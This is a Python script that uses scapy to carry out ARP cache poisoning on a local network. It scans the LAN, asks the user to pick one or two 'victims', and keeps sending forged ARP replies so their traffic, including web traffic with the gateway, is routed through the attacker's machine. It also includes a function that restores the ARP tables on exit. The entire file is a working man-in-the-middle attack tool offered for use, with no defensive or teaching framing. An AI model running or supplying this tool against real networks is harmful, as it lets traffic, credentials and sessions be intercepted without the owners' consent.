import ScanDevices
from scapy.all import *
import threading

MY_IP = get_if_addr(conf.iface)
MY_MAC = get_if_hwaddr(conf.iface)
GATEWAY_IP = conf.route.route("0.0.0.0")[2]

def gateway_mac():
    print("[*] Gathering Default Gateway's IP...")
    arp = ARP(op=1, pdst = GATEWAY_IP)
    response = sr1(arp)
    return response.hwsrc

GATEWAY_MAC = gateway_mac()

def poison(victimA_ip, victimA_mac, victimB_ip, victimB_mac):
    print("\n[*] Poisoning...")
    poison_AtoB = ARP(op=2, psrc=victimB_ip, pdst=victimA_ip, hwsrc=MY_MAC, hwdst=victimA_mac)
    poison_BtoA = ARP(op=2, hwdst=victimB_mac, hwsrc=MY_MAC, pdst=victimB_ip, psrc=victimA_ip)
    while True:
        try:
            send(poison_AtoB)
            send(poison_BtoA)
            time.sleep(5)
        except KeyboardInterrupt:
            restore(victimA_ip, victimA_mac, victimB_ip, victimB_mac)
            break

def restore(victimA_ip, victimA_mac, victimB_ip, victimB_mac):
    restore_AtoB = ARP(op=2, psrc=victimB_ip, pdst=victimA_ip, hwsrc=victimB_mac, hwdst=victimA_mac)
    restore_BtoA = ARP(op=2, psrc=victimA_ip, pdst=victimB_ip, hwsrc=victimA_mac, hwdst=victimB_mac)
    send(restore_AtoB)
    send(restore_BtoA)

def main():
    print("[*] Scanning for devices in the LAN...")
    ScanDevices.Scan()

    file = open("ip_list.txt", 'r')
    ip_list = file.read().split()

    isLocal = 1
    while True:
        try:
            isLocal = int(input("\n[?] Please enter the number of operation:\n1) Listen to 1 victim's web trafic.\n2) Listen to the traffic between 2 seperate victims.\n"))
            if not (isLocal in (1,2)):
                print("[!] Invalid input!")
                continue
        except:
            print("[!] Invalid input!")
            continue
        break

    print("Active devices in your LAN:")
    for i in range(len(ip_list)):
        ip_list[i] = ip_list[i].split(';')
        if ip_list[i][0] == GATEWAY_IP:
            print(str(i) + ") " + "Default Gateway (" + str(ip_list[i][0]) + ")")
        else:
            print(str(i) + ") " + str(ip_list[i][0]))

    if isLocal == 1:
        while True:
            try:
                victim = int(input("\n[?] Enter the victim's number (from the list above):\n"))
                poison(ip_list[victim][0], ip_list[victim][1], GATEWAY_IP, GATEWAY_MAC)
            except:
                print("[!] Invalid input!")
                continue
            break

    else:
        while True:
            try:
                victimA = int(input("\n[?] Enter the No. 1 victim number (from the list above):\n"))
                victimB = int(input("[?] Enter the No. 2 victim number:\n"))
                poison(ip_list[victimA][0], ip_list[victimA][1], ip_list[victimB][0], ip_list[victimB][1])
            except:
                print("[!] Invalid input!")
                continue
            break

if __name__ == '__main__':
    main()